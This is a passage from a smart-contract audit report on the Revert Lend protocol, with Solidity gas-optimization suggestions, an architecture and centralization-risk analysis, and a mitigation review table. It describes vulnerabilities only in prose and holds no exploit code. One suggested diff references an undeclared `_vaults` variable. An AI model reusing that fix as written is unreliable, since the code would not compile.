65:        bytes swapData; // if its a swap order - must include swap data
66:        uint128 liquidity; // liquidity the calculations are based on
67:        uint256 amountRemoveMin0; // min amount to be removed from liquidity
68:        uint256 amountRemoveMin1; // min amount to be removed from liquidity
69:        uint256 deadline; // for uniswap operations - operator promises fair value
70:        uint64 rewardX64; // which reward will be used for protocol, can be max configured amount (considering onlyFees)
71:    }
```

[AutoExit.sol#L63-L71](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/AutoExit.sol#L63-L71)

### Recommended Mitigation Steps

```diff
File : automators/AutoExit.sol

63:    struct ExecuteParams {
64:        uint256 tokenId; // tokenid to process
65:        bytes swapData; // if its a swap order - must include swap data
-66:        uint128 liquidity; // liquidity the calculations are based on
67:        uint256 amountRemoveMin0; // min amount to be removed from liquidity
68:        uint256 amountRemoveMin1; // min amount to be removed from liquidity
-69:        uint256 deadline; // for uniswap operations - operator promises fair value
+69:        uint64 deadline; // for uniswap operations - operator promises fair value
70:        uint64 rewardX64; // which reward will be used for protocol, can be max configured amount (considering onlyFees)
+66:        uint128 liquidity; // liquidity the calculations are based on
71:    }
```

## [G-10] Make `calculation` constant instead of calculating every time on function call

### Mark `Q96 * Q64` constant saves 1 checked multiplication

You can make the calculation involving `Q96 * Q64` constant. This will avoid recalculating the result every time the function is called saving 1 checked multiplication.

```solidity
File : automators/Automator.sol

158:  amountOutMin = FullMath.mulDiv(amountIn * (Q64 - maxPriceDifferenceX64), priceX96, Q96 * Q64);
```

[Automator.sol#L158](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L158)

### Recommended Mitigation Steps

```diff
File : automators/Automator.sol

+  // Define Q96_TIMES_Q64 as a constant
+  uint256 constant Q96_TIMES_Q64 = Q96 * Q64;

-158:  amountOutMin = FullMath.mulDiv(amountIn * (Q64 - maxPriceDifferenceX64), priceX96, Q96 * Q64);
+158:  amountOutMin = FullMath.mulDiv(amountIn * (Q64 - maxPriceDifferenceX64), priceX96, Q96_TIMES_Q64);
```

### Make `Q32 + MAX_DAILY_LEND_INCREASE_X32` constant save (~180 Gas)

```solidity
File : V3Vault.sol

1251: * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;
```

[V3Vault.sol#L1251](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1251)

### Recommended Mitigation Steps

```diff
File : V3Vault.sol

+  uint256 constant Q32PlusMAX_DAILY_LEND_INCREASE_X32 = Q32 + MAX_DAILY_LEND_INCREASE_X32;

-1251: * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;
+1251: * (Q32PlusMAX_DAILY_LEND_INCREASE_X32) / Q32;
```

## [G-11] `Check` before updating `bool` with same value

### Instance 1

Lack of a check could potentially result in unnecessary state changes and gas costs if the `_active` value passed to the function is the same as the current value stored in the `operators` mapping.

Adding a simple check to compare the new `_active` value with the current value stored in the mapping before updating it could optimize gas usage and prevent unnecessary state changes.

```solidity
File : automators/Automator.sol

69:   function setOperator(address _operator, bool _active) public onlyOwner {
70:       emit OperatorChanged(_operator, _active);
71:        operators[_operator] = _active;
72:    }
```

[Automator.sol#L69-L72](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L69-L72)

### Recommended Mitigation Steps

```diff
File : automators/Automator.sol

69:   function setOperator(address _operator, bool _active) public onlyOwner {
+       if (operators[_operator] != _active) {
70:       emit OperatorChanged(_operator, _active);
71:        operators[_operator] = _active;
+         }
72:    }
```

### Instance 2

As with the previous `Instance 1` there is no explicit check to determine whether the `_active` value being set is different from the current value stored in the `vaults` mapping for the given `_vault` address. This lack of a check could result in unnecessary state changes and gas costs if the `_active` value passed to the function is the same as the current value stored in the mapping.

```solidity
File : automators/Automator.sol

79:    function setVault(address _vault, bool _active) public onlyOwner {
80:      emit VaultChanged(_vault, _active);
81:       vaults[_vault] = _active;
82:    }
```

[Automator.sol#L79-L82](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L79-L82)

### Recommended Mitigation Steps

```diff
File : automators/Automator.sol

79:    function setVault(address _vault, bool _active) public onlyOwner {
+       if (vaults[_vaults] != _active) {
80:      emit VaultChanged(_vault, _active);
81:       vaults[_vault] = _active;
+        }
82:    }
```

## [G-12] Switch the order around `&&` to use `shortcircuit` to save gas (Instances missed by bot)

### Instance 1

You can switch the order of conditions in the `if` statement to utilize short-circuit evaluation. This ensures that `if` the first condition `(unwrap)` is `false` the second condition `(address(weth) == address(token))` won't even be evaluated.

```solidity
File : automators/Automator.sol

219:  if (address(weth) == address(token) && unwrap) {
```

[Automator.sol#L219](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L219)

### Recommended Mitigation Steps

```diff
File : automators/Automator.sol

-219:  if (address(weth) == address(token) && unwrap) {
+219:  if (unwrap && address(weth) == address(token)) {
```

## [G-13] No need to cache a function call if used only once

### Instance 1

No need to cache `params.tokenIn.balanceOf(address(this))` and `params.tokenOut.balanceOf(address(this))` in stack variable in `balanceInAfter` and `balanceOutAfter` respectively, since they are used only once.

```solidity
File  : utils/Swapper.sol

104:   uint256 balanceInAfter = params.tokenIn.balanceOf(address(this));
105:   uint256 balanceOutAfter = params.tokenOut.balanceOf(address(this));
...
107:   amountInDelta = balanceInBefore - balanceInAfter;
108:   amountOutDelta = balanceOutAfter - balanceOutBefore;
```

[Swapper.sol#L104-L108](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/utils/Swapper.sol#L104-L108)

### Recommended Mitigation Steps

```diff
File  : utils/Swapper.sol

-104:   uint256 balanceInAfter = params.tokenIn.balanceOf(address(this));
-105:   uint256 balanceOutAfter = params.tokenOut.balanceOf(address(this));
...
-107:   amountInDelta = balanceInBefore - balanceInAfter;
-108:   amountOutDelta = balanceOutAfter - balanceOutBefore;
+107:   amountInDelta = balanceInBefore - params.tokenIn.balanceOf(address(this));
+108:   amountOutDelta = params.tokenOut.balanceOf(address(this)) - balanceOutBefore;
```

### Instance 2

No need to cache `nonfungiblePositionManager.ownerOf(tokenId)` in stack variable `owner` since this is used only once in the function.

```solidity
File : automators/AutoExit.sol

219:  address owner = nonfungiblePositionManager.ownerOf(tokenId);
220:     if (owner != msg.sender) {
221:        revert Unauthorized();
222:     }
```

[AutoExit.sol#L219-L222](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/AutoExit.sol#L219-L222)

### Recommended Mitigation Steps

```diff
File : automators/AutoExit.sol

-219:  address owner = nonfungiblePositionManager.ownerOf(tokenId);
-220:     if (owner != msg.sender) {
+220:     if (nonfungiblePositionManager.ownerOf(tokenId) != msg.sender) {
221:        revert Unauthorized();
222:     }
```

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/514#issuecomment-2020624410)**

***


# Audit Analysis

For this audit, 8 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340) by **14si2o_Flint** received the top score from the judge.

*The following wardens also submitted reports: [yongskiws](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/517), [invitedtea](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/495), [popeye](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/153), [Sathish9098](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/505), [hunter\_w3b](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/442), [K42](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/266), and [Bauchibred](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/154).*


## Description of Revert Lend

Revert has been developing analytical tools and dashboards to simplify and facility interaction with AMM protocols since June 2022. It is their stated belief that AMM protocols will play a pivotal role in the financial crypto markets in the coming years and they wish to help retails invests interact with these complex and sometimes obtuse protocols. These tools are mainly focused on Uniswap v3.

Revert Lend is their newest initiative, an ERC4626 lending protocol that takes a unique approach by allowing the Uniswap v3 NFT position to be used as collateral to facilitate the acquisition of ERC20 token loans, while allowing the users to retain control and management of their capital within Uniswap v3 Pools. As a consequence, it becomes possible to unify all the liquidity provided from all accepted tokens into one pool.   

Another rare aspect of the protocol is the variable interest rate, which is completely dependent on the ebb and flow of the market. 

## Approach taken for this audit

### Time spent on this audit: 11 days

**Day 1: 7h 35 mins** 
 - Reading the whitepaper and documentation.
 - Studying Uniswap V3, ERC4626.
 - Researching hacks of similar protocols.
 - Creating giant checklist of possible issues.

**Day 2-3: 13h 37 mins**
 - First pass through the code, adding questions to note.md while I read.
 - Creating hand-drawn functional diagrams of all functions available to normal users in Excalidraw. 

**Day 4-6 : 17h 50mins** 
 - Second Pass through the code.

**Day 7-8: 11h 06 mins**
  - Go through notes one-by-one answering all questions and adding to preliminary findings.
  - Finalising preliminary findings.
  - Trying to test as many as I can in Foundry.
  
**Day 9-11: 20h 55mins** 
  - Writing reports & analysis.

## Architecture

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

In order to properly understand the architecture of the protocol, it is necessary to understand its history. 

Revert started back in June of 2022 with a mission of building actionable analytics for liquidity providers in AMM protocols, with a focus on Uniswap. To this end, they developed the [initiator](https://mirror.xyz/revertfinance.eth/n7HcSKIUcZGVLmduPFFhu5vmKWUU8HKdUNfLR1o9LRE) and over time they added new functionalities and products such as V3Utils, Auto-Compound, Auto-Exist, Leverage-Transformer and Auto-Range. Revert Lend is their newest product which aims to introduce an ERC4626 vault. 

As such, the architecture should not be seen as a master drawing of "the Architect", but as many layers of architectural drawings, each becoming more complex and integrating what came before. As ingenious as it may be, the more custom functionality that has to be developed to allow everything to fit together, the higher the chances of something being overlooked and exploited. 

### Architectural Risks

This becomes apparent when we evaluate how the V3Vault interacts with the automated contracts through `transform()`. 

For `AutoCompound` and `AutoRange`:
 - User calls `executeWithVault` from the transformer.
 - This calls `Ivault(vault).transform()`.
 - The vault calls back `execute()` to the transformer.

For `AutoExit`,`FlashloanLiquidator`,`LeverageTransformer` and `V3Utils`:
 - User calls `transform()` from the vault.

I couldn't find an explanation anywhere in the documentation for having 2 different patterns. In itself this is not a security risk, but the chance of their being an oversight and a risk today or in future incarnations of the protocol, increases exponentially with each additional pattern.    

Another issue is the multiplication of similar functionalities across the different contracts. When we look at Uniswap `decreaseLiquidity`, we can see that every contract besides `FlashloanLiquidator` can call this on a position. Again, in itself not a security risk, but the effort required to make sure that all instances are correctly configured and there exists no difference that be exploited, increases exponentially with each added similar functionality. 

### Recommendations

1. Streamline and perhaps externalise (`ITransform`) the access pattern between the vault and transformers so that there is only one correct way in which the communication between the two can happen.

2. Re-factor some of the existing contracts to reduce multiplication of similar functionality.  


## Main contracts and functionality

For each contract we will give a short description, an overview of the most important functions available to users and a custom function diagram to visualise internal and external calls. Furthermore, any findings will be mentioned with the relevant function.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

### V3Vault.sol

An IERC4626 compliant contract that manages one ERC20 asset for lending and borrowing. It accepts Uniswap v3 positions as collateral where these positions are composed of any 2 tokens which each have been configured to have a `collateralFactor` `> 0`. 

**External view functions:**

*Note: to view the provided images, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

- **`vaultInfo()`**
  - This functions retrieves the global information about the vault.
  - It makes use of the following internal functions:
    - ``_calculateGlobalInterest()``
    - `_getAvailableBalance()`
    - ``_convertToAssets()`` x2

- **`lendInfo()`**: 
  - Here the lending information for a specified account is retrieved.
  - It makes use of the following internal functions:
    - ``_calculateGlobalInterest()``
    - ``_convertToAssets()` `
  - When we compare `vaultInfo` and `lendInfo`, we can see that the rounding for calculating the lending information is different. Due to this, the total lent from `vaultInfo` will be greater then the sum of `lendInfo` from all accounts. This could be considered a breaking of a fundamental invariant.

- **`loanInfo()`**: 
  - The `tokenId`, which is the corresponding Uniswap V3 position, is used as input to retrieve the details of a loan.
  - It makes use of the following internal functions:
    - ``_calculateGlobalInterest()``
    - ``_convertToAssets()` `
    - `_checkLoanIsHealthy()`
    - `_calculateLiquidation()`
  - When we look at the NatSpec and the naming of the function, it would seem obvious that you will receive the information for one **specific** loan. The code however, tells a different story. It calculate the debt as the sum of ALL loans taken against a position and calculate the health threshold on this global figure. This will gives users a completely erroneous understanding of their situation.

**IERC4626 overridden external view functions:**

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

- **`totalAssets()`**
  - Note that `totalAssets` makes use of `balanceOf(address(this))`, which opens an important attack vector of inflation attacks as detailed in finding `H- Inflation attack due to the absence of dead shares and the reliance on balanceOf`. 
  
- **`convertToShares()`**
  - It makes use of the following internal functions:
    - `_calculateGlobalInterest()`
    - `_convertToShares()`

- **`convertToAssets()`**
  - It makes use of the following internal functions:
    - `_calculateGlobalInterest()`
    - `_convertToAssets()`

- **`maxDeposit()`**
  - It makes use of the following internal functions:
    - `_calculateGlobalInterest()`
    - `_convertToAssets()`

- **`maxMint()`**
  - It makes use of the following internal functions:
    - `_calculateGlobalInterest()`
    - `_convertToShares()`

- **`maxWithdraw()`**
  - It makes use of the following internal functions:
    - `_calculateGlobalInterest()`
    - `_convertToAssets()`

- **`maxRedeem()`**
  - `balanceOf(owner)`

- **`previewDeposit()`**
  - It makes use of the following internal functions:
    - `_calculateGlobalInterest()`
    - `_convertToShares()`

- **`previewMint()`**
  - It makes use of the following internal functions:
    - `_calculateGlobalInterest()`
    - `_convertToAssets()`

- **`previewWithdraw()`**
  - It makes use of the following internal functions:
    - `_calculateGlobalInterest()`
    - `_convertToShares()`

- **`previewRedeel()`**
  - It makes use of the following internal functions:
    - `_calculateGlobalInterest()`
    - `_convertToShares()`

**IERC4626 overridden external functions:**

*Note: to view the provided images, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

- **deposit(assets, receiver)**
  - It makes use of the following internal functions:
    - `_deposit()`

- **mint(shares, receiver)**
  - It makes use of the following internal functions:
    - `_deposit()`

- **deposit(shares, receiver, `permitData`)**
  - It makes use of the following internal functions:
    - `_deposit()`

- **mint(shares, receiver, `permitData`)**
  - It makes use of the following internal functions:
    - `_deposit()`

- **withdraw(assets, receiver, owner)**
  - It makes use of the following internal functions:
    - `_withdraw()`

- **redeem(shares, receiver, owner)**
  - It makes use of the following internal functions:
    - `_withdraw()`

Note that `withdraw` and `redeem` are the only functions to not have a permit2 version. Even though the use-case is rare, for completeness those version should be added.

**External functions:**

*Note: to view the provided images, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

- **`create()`**
  - The Uniswap V3 NFT position is transferred to the Vault contract and ownership is set to `msg.sender` or recipient if he is defined through `onERC721Received`.
  - Note that the `onERC721Received` is inconsistent with the EIP721 standard.

- **`createWithPermit()`**
  - The permit version of the abovementioned `create()` function. 
  - Ownership of position is transferred to the Vault contract and set to `msg.sender` or recipient if he is defined through `onERC721Received`.

- **`approveTransform()`**
  - A user can approve automated agents (transformers/automators) which will allow them to call the `transform` function.
    
- **`transform()`**
  - This function is the entry point for all the automated tools developed by the Revert protocol. Users approve these tools through `approveTransform`, which allows them to call transform to perform any user actions in an automated fashion.
  - It makes use of the following internal functions:
    - `_updateGlobalInterest()`
    - `_convertToAssets()`
    - `_requireLoanIsHealthy() ` 

    Note that the code comments for "Unauthorized" checks are incorrect.

- **`borrow()`**
  - A pivotal function in any lending protocol, the borrow functions allow a user to borrow assets with the uniswap position as collateral.
  - It makes use of the following internal functions:
    - `_updateGlobalInterest()`
    - `_resetDailyDebtIncreaseLimit()`
    - `_convertToShares()`
    - `_updateAndCheckCollateral()`
    - `_convertToAssets()`

- **`decreaseLiquidityAndCollect`**
  - A user can decrease the liquidity of a given position and resultant assets and potential fees.
  - It is of remark that transformers are not allowed to use this function since they can call the methods directly on the `nonFungiblePositionManager`.    
  - It makes use of the following internal functions:
    - `_updateGlobalInterest()`
    - `_convertToAssets()`
    - `_requireLoanIsHealthy()`

- **repay(`tokenId`, amount, `IsShare`)**
  - Used to repay borrowed tokens. Can be denominated in assets or shares. 
  - It makes use of the following internal functions:
    - `_repay()`

- **repay(`tokenId`, amount, IsShare, `permitData`)**
  - The permit version of repay. 
  - Used to repay borrowed tokens. Can be denominated in assets or shares. 
  - It makes use of the following internal functions:
    - `_repay()`

- **`liquidate()`**
  - This function is used to liquidate unhealthy loans. 
  - Transformers cannot call this function directly.
  - It makes use of the following internal functions:
    - `_updateGlobalInterest()`
    - `_convertToAssets()`
    - `_checkLoanIsHealthy()`
    - `_calculateLiquidation()`
    - `_handleReserveLiquidation()`
    - `_sendPositionValue()`
    - `_cleanupLoan()`
    - Note that the `liquidate` function has a major flaw in that it only transfers fees from the owner to the liquidator and not decreased liquidity. This causes the liquidator to not obtain the liquidity he paid for and the owner receives part of the liquidity he should have lost.
    - Also note that the `decreaseLiquidity` call is performed with **100% slippage tolerance**, which can cause the liquidity returned to be close to zero.

### V3Oracle.sol

This is contract is in V3Vault to calculate the value of positions. It is the main vector of obtaining price data and uses both Chainlink as well as Uniswap v3 TWAP. Furthermore, it also provides emergency fallback mode. 

*Note: to view the provided images, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

**`getValue`**
- The function obtains value and prices of a Uniswap v3 LP Position in specified token. It uses the configured oracles and verifies price on a second oracle. This the main function used by V3Vault functions to obtain price data.
- It makes use of the following functions:
  - `getPositionBreakDown()`
  - `_getReferenceTokenPriceX96()`
  - `_checkPoolPrice()`

Note that a minor issue exists in `_requireMaxDifference`, which is called by `_checkPoolPrice`, as detailed in finding `[L-05] Limit set to low in _requireMaxDifference`.

**`getPositionBreakDown`**
- It returns a breakdown of a Uniswap v3 position (tokens and fee tier, liquidity, current liquidity amounts, uncollected fees).
- It makes use of the following internal functions:
  - `_initializeState()`
  - `_getAmounts()`

### V3Utils.sol

Stateless contract with utility functions for Uniswap V3 positions. 

**`executeWithPermit`**
- This function calls `execute` with EIP712 permit.
- It makes use of the following functions:
  - `execute()`
 
*Note: to view the provided images, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

**`execute`**
- This functions executes the provided instructions by pulling approved NFT instead of direct safeTransferFrom.
- It can make use of the following internal functions:
  - `_decreaseLiquidity()`
  - `_collectFees()`
  - `_swapAndIncrease()`
  - `_swapAndMint()`
  - `_routerSwap()`
  - `_transferToken()`

**`swap`**
- This function swaps `amountIn` for `tokenOut` - returning at least `minAmountOut`.
- It makes use of the following internal functions:
  - `_prepareAddPermit2()`
  - `_prepareAddApproved()`
  - `_routerSwap()`
  - `_transferToken()`

**`swapAndMint`**
- This function performs 1 or 2 swaps from `swapSourceToken` to `token0` and `token1` and adds as much as possible liquidity to a newly minted position.
- It makes use of the following internal functions:
  - `_prepareAddPermit2()`
  - `_prepareAddApproved()`
  - `_swapAndMint()`

**`swapAndIncreaseLiquidity`**
- This function performs 1 or 2 swaps from `swapSourceToken` to `token0` and `token1` and adds as much as possible liquidity to any existing position.
- It makes use of the following internal functions:
  - `_prepareAddPermit2()`
  - `_prepareAddApproved()`
  - `_swapAndincrease()`

### AutoExit.sol

This automator contract allows a v3 position to be automatically removed (limit order) or to be swapped to the opposite token (stop loss order) when it reaches a certain tick. The execution of the optimized swap is delegated to a revert controlled bot (operator) using an externalswap router.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

**`execute`**
- This can only be from a configured operator account. Furthermore, the swap need to be executed within the maximum price difference allowed from the current pool price. 
- It makes use of the following internal functions:
  - `_getPool()`
  - `_decreaseFullLiquidityAndCollect()`
  - `_validateSwap()`
  - `_routerSwap()`
  - `_transferToken()`

### FlashloanLiquidator.sol

A helper contract which allows atomic liquidation and needed swaps by using Uniswap v3 Flashloan.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

**`liquidate`**
- This function liquidates a loan from the V3Vault.
- It makes use of the following functions:
  - `flashLoanPool.flash()`
  - This causes `uniswapV3FlashCallback()` to be invoked.

### LeverageTransformer.sol

This contract offers functionality to leverage or deleverage Uniswap v3 positions in one transaction.

*Note: to view the provided images, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

**`leverageUp`**
- The liquidity of a Uniswap v3 position is increased by this function. 
- It can only be called through the `transform` function in `V3Vault.sol`.
- It makes use of the following functions:
  - `IVault(msg.sender).borrow()`
  - `_routerSwap()`

**`leverageDown`**
- The liquidity of a Uniswap v3 position is decreased by this function. 
- It can only be called through the `transform` function in `V3Vault.sol`.
- It makes use of the following functions:
  - `_routerSwap()`
  - `IVault(msg.sender).repay()`

### AutoCompound.sol

This contract allows an approved operator of AutoCompound to compound a position. When called from outside the vault, the positions need to be approved, when called inside, the owner needs to approve the position to be transformed by the contract. 

*Note: to view the provided images, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

**`executeWithVault`**
- The token position in the vault is adjusted through the transform function. It can only be called from the configured operator account or from the vault.
- It makes use of the following function:
  - `IVault(vault).transform()`

**`execute`**
- This adjusts the token directly and only be called from the configured operator account or by the vault through `transform`.
- It makes use of the following internal functions:
  - `_getPool()`
  - `_hasMaxTWAPTickDifference()`
  - `_poolSwap()`
  - `_checkApprovals()`
  - `_setBalance()`
  - `_increaseBalance()`

### AutoRange.sol

This contract allows an approved operator of AutoRange to change the range for the configured position. If called inside Vault, it will use the transform method. If outside, the positions need to be approved for the contract and configures with configToken function. 

*Note: to view the provided images, please see the original submission [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340).*

**`executeWithVault`**
- The token position in the vault is adjusted through the transform function. It can only be called from the configured operator account or from the vault.
- It makes use of the following function:
  - `IVault(vault).transform()`

**`execute`**
- This adjusts the token directly and only be called from the configured operator account or by the vault through `transform`.
- It makes use of the following internal functions:
  - `_decreaseFullLiquidityAndCollect()`
  - `_getPool()`
  - `_getTickSpacing()`
  - `_routerSwap()`
  - `_transferToken()`

## Codebase Quality

As a whole, I evaluate the quality of `Revert Lend` codebase to be "Good". The contract and function design are clearly well thought out, access control is properly implemented and the various standards are well implemented. Some improvements on attention on detail would be advisable and there are architectural complexities. Details are explained below:

| Codebase Quality Categories | Comments    |
| ------------------------------ | ---------------- |
| **Architecture** | Each of the separate products of Revert is well designed, segregating functionality into distinct contracts (e.g., automators, interfaces, transformers, utils) for clarity and ease of maintenance. Further separating the interest model from the vault indicates a clear intention for separation of concerns. When we take entire complex puzzle of all the products together, there are certain concerns as explained above in the Architecture part. |
| **Upgradeability** | In the whitepaper (page 5), it is stated: `Revert Lend implements a nonupgradable contract design. This decision ensures the integrity of the protocol, minimizing the risk of introducing errors or modifying security trade-offs, through any future modifications.` This represents, in my humble opinion, a grave error in judgment. The primary reason why most, if not all, major protocols implement some form of upgradeability, is that bugs and errors are almost assured to happen no matter the quality of the codebase. Regardless of the number of audits, there cannot be a guarantee that a bug will not be found. If the bug stops users from obtaining their funds or allow malicious users to steal with impunity, the protocol team is powerless to act without some form of control. I would strongly recommend the team to implement upgradeability which can easily be burned after a certain amount of time has passed and the risk of problems becomes minute. |
| **Code Comments** | The contracts are accompanied by comprehensive comments, facilitating an understanding of the functional logic and critical operations within the code. Functions are described purposefully, and complex sections are elucidated with comments to guide readers through the logic. However, there are several instances where comments remain when the code logic has changed. The protocol could benefit from a spring cleaning excercise where the code comments are all reviewed. |
| **Testing** | The protocol has an excellent level of test coverage, approaching nearly 100%. This ensures that a wide array of functionalities and edge cases are tested, contributing to the reliability and security of the code. However, to further enhance the testing framework, the incorporation of fuzz testing and invariant testing is recommended. |
| **Security Practices** | The contracts demonstrate awareness of common security pitfalls in Solidity development. Functions are guarded with appropriate access control modifiers (e.g., `onlyOwner`,`emergencyAdmin`, `transformer mode` checks), and state-changing functions are protected against reentrancy attacks. One area of concern is the intention of the protocol to implement `transient` storage for the `transformedTokenId` variable, which guards against reentrancy, once the Dencun upgrade goes live. Transient storage is extremely new and there have already been realistic [formulations](https://chainsecurity.com/tstore-low-gas-reentrancy/) of reentrancy attacks through the use transient storage. As such, I would recommend much caution in implementing these transient variables and/or request an additional audit to explore these specific security issues. |   
| **Error Handling** | The custom errors are defined in `IErrors` and correctly applied throughout the codebase. However, in some cases it would have useful to implement the errors with a more expansive message. | 
| **Documentation** | The sole documentation for the V3Vault is the whitepaper, which is excellently written. Nevertheless, more documentation describing the protocol would be very useful. |


## Centralization Risks

The protocol defines 2 privileged roles:  `Owner` and `EmergencyAdmin`.

The `Owner` is set to a Multisig and Timelock according to the audit README and has the following rights:
- In `V3Oracle`:
  - `setTokenConfig`
  - `setEmergencyAdmin`
  - `setMaxPoolPriceDifference`
- In `V3Vault`:
  - `withdrawReserves`
  - `setTransformer`
  - `setLimits`
  - `setReserveFactor`
  - `setReserveProtectionFactor`
  - `setTokenConfig`
  - `setEmergencyAdmin`  
- In `AutoCompound`:
  - `setReward`

The main issue with the owner design is that all changes are One-Step operations. Regardless whether it is changing the owner itself or setting a token configuration, even the tiniest mistake could cause major damage to the protocol. Either by setting the owner to a random address or wrongly setting twap seconds or a token address, which would give hackers an immediate and easy attack vector to drain the protocol, a single mistake is devastating.  

I would recommend the implementation of a two-step approval process for the most critical of operations. Also, the audit README states that the owner is a multisig subject to a Timelock, but nothing of the sorts can be seen in the contract code.

The `EmergencyAdmin` is set to a Multisig according to the audit README and has the following rights: 
- In `V3Oracle`:
  - `setOracleMode`
- In `V3Vault`:
  - `setLimits`

The `emergencyAdmin` can essentially pause the protocol by setting the limits to `0` and it can change the oracle from TWAP to Chainlink or change the verification mode. However, if issues are found that are not affected by these limits (liquidation, transformer misbehaving), then the `emergencyAdmin` does not have the powers to take action.   

Instead of a custom role, I would recommend to implement the standardised pattern of **pause/unpause**, and adding the `whenNotPaused` modifier to all functions which change state in the protocol. Thus allowing the admin to freeze the entire protocol in case of emergency.    

## Systemic & Integration Risks

### Reliance on double Oracle

The protocols obtain the price information from either Chainlink or Uniswap TWAP and uses the other to verify the price against manipulation. In itself an excellent design but it does mean that the oracle will malfunction if either of the oracle sources malfunctions. This has happened before and even though it is certainly not a reason to not use double verification, it is a risk that should be acknowledged.

Note that proper configuration is also of paramount importance, since the current code will malfunction due to the absence of a L2 sequencer check when deploying on Arbitrum. 

### Off-chain Router

Many of the transformers make use of an off-chain router to execute swaps. The router is outside the scope of the audit and we cannot evaluate its design or assess its security. As such, if the router were to go off-line or be compromised, the entire protocol will be compromised.    

### Integrating ERC4626 Vault with Transformers

Transformers are treated as trusted actors and can effect state-changing calls on the Vault. In itself, this is not a problem. However, as noted above in the architectural risks part, the multiplication of similar functionality exponentially increases the risk of a security oversight.

Furthermore, the current design allows future transformers, which might have security issues or unforeseen side-effects when interacting with the vault, to be quickly added as a trusted source.

### Lack of Upgradeability

The absence of any upgradeability leaves the protocol powerless when critical bugs and errors are found. While it is true that upgrades can also introducing security issues (Euler [hack](https://www.euler.finance/blog/war-peace-behind-the-scenes-of-eulers-240m-exploit-recovery) is a famous example), bugs are as certain as death & taxes, so functionality to resolve these should be implemented.

I would recommend implementing the [UUPS](https://eips.ethereum.org/EIPS/eip-1822) proxy pattern since this allows the protocol to resolve bugs and burn the upgradeability once the protocol has been live for a significant amount of time and the likelihood of new bugs becomes minute.

### Transient Storage

The protocol intents (code comment) to use transient storage for the `transformedTokenId` variable, which is critical for guarding against reentrancy. This could a problem since it is a new and fairly unexplored functionality. Since some theoretical [reentrancy](https://chainsecurity.com/tstore-low-gas-reentrancy/) attacks are already being discussed, I would suggest much prudence in implementing this.  

### Time spent

71 hours

**[kalinbas (Revert) acknowledged](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/340#issuecomment-2020958837)**

***

# [Mitigation Review](#mitigation-review)

## Introduction

Following the C4 audit, 3 wardens ([b0g0](https://code4rena.com/@b0g0), [ktg](https://code4rena.com/@ktg) and [thank\_you](https://code4rena.com/@thank_you)) reviewed the mitigations for all identified issues. Additional details can be found within the [C4 Revert Lend Mitigation Review repository](https://github.com/code-423n4/2024-04-revert-mitigation-findings).

## Mitigation Review Scope

| URL | Mitigation of | Purpose | 
| ----------- | ------------- | ----------- |
| https://github.com/revert-finance/lend/pull/19 | H-01 | Checks token in permit | 
| https://github.com/revert-finance/lend/pull/8 https://github.com/revert-finance/lend/pull/32 | H-02 | Removed sending of NFT to avoid reentrancy | 
| https://github.com/revert-finance/lend/pull/29 | H-03 | Refactoring to make all transformers properly check caller permission | 
| https://github.com/revert-finance/lend/pull/29 | H-04 | Refactoring to make all transformers properly check caller permission | 
| https://github.com/revert-finance/lend/pull/10 | H-05 | Fixed calculation | 
| https://github.com/revert-finance/lend/pull/8 https://github.com/revert-finance/lend/pull/32 | H-06 | Removed sending of NFT to avoid reentrancy | 
| https://github.com/revert-finance/lend/pull/23 | M-05 | Fixed | 
| https://github.com/revert-finance/lend/pull/22 | M-06 | Fixed | 
| https://github.com/revert-finance/lend/pull/21 | M-07 | Fixed | 
| https://github.com/revert-finance/lend/pull/11 | M-08 | Fixed | 
| https://github.com/revert-finance/lend/pull/20 | M-09 | Fixed | 
| https://github.com/revert-finance/lend/pull/18 | M-10 | Fixed | 
| https://github.com/revert-finance/lend/pull/17 | M-11 | Added safety buffer for borrow and `decreaseLiquidity` (not for transformers) | 
| https://github.com/revert-finance/lend/pull/16 | M-12 | Fixed | 
| https://github.com/revert-finance/lend/pull/15 | M-14 | Fixed | 
| https://github.com/revert-finance/lend/pull/8 https://github.com/revert-finance/lend/pull/32 | M-15 | Fixed | 
| https://github.com/revert-finance/lend/pull/14 https://github.com/revert-finance/lend/pull/30 | M-16 | Fixed | 
